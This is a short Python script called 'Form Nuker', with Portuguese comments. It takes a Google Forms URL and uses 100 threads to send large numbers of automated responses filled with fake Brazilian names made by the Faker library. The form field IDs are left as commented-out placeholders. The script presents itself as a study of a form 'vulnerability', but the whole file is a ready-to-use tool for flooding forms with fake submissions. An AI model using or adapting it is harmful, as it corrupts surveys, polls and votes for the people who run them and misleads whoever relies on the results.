import requests
import threading
import json
import random
import time
from random import randint
from faker import Faker
from faker.providers import internet

#Utilize por sua conta e risco, script criado com a finalidade de estudar uma 'Vulnerabilidade' nos formulários google, automatizando e potencializando a quantidade de respostas enviadas.


print("""  
    ______                        _   __      __            
   / ____/___  _________ ___     / | / /_  __/ /_____  _____
  / /_  / __ \/ ___/ __ `__ \   /  |/ / / / / //_/ _ \/ ___/
 / __/ / /_/ / /  / / / / / /  / /|  / /_/ / ,< /  __/ /    
/_/    \____/_/  /_/ /_/ /_/  /_/ |_/\__,_/_/|_|\___/_/     
                                                            """)
print("Criado por Emanuel 'e1ghts1x' K e Guilherme Colombari")

faker = Faker("pt_BR")
url = input("Insira a URL: ")
url = url + "/formResponse"
vezes = input("Insira a quantidade a ser mandada: ")
print("Aperte CTRL+C para cancelar e sair do programa")

threads = []

def start():
    for _ in range(int(vezes)):
        names = faker.name()
        data = {
            #Coloque as entrys do formulário em questão
            #"entry.579721778":	names,
            #"entry.427545610":	"TADS",
            #"entry.427545610_sentinel":	"",
            #"fvv":	"1",
            #"partialResponse":	"[null,null,\"-7675839472969137428\"]",
            #"pageHistory": "0",
            #"fbzx":	"-7675839472969137428"
            }
        requests.post(url, data=data).text
        print(f"Resposta contabilizada")

for i in range(100):
    t = threading.Thread(target=start)
    t.daemon = True
    threads.append(t)

for i in range(100):
    threads[i].start()

for i in range(100):
    threads[i].join()